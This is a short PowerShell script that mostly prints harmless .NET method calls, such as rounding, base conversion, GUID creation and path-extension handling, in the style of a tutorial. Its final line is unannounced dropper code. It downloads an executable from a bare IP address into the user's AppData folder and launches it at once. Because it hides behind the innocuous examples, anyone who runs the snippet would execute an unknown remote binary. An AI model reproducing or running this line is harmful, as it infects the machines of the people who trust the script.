Write-Host "[Math]::Round(7.9)"

Write-Host "[Convert]::ToString(576255753217, 8)"

Write-Host "[Guid]::NewGuid()"

Write-Host "[Net.Dns]::GetHostByName('schulung12')"

Write-Host "[IO.Path]::GetExtension('c:\test.txt')"

Write-Host "[IO.Path]::ChangeExtension('c:\test.txt', 'bak')"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")

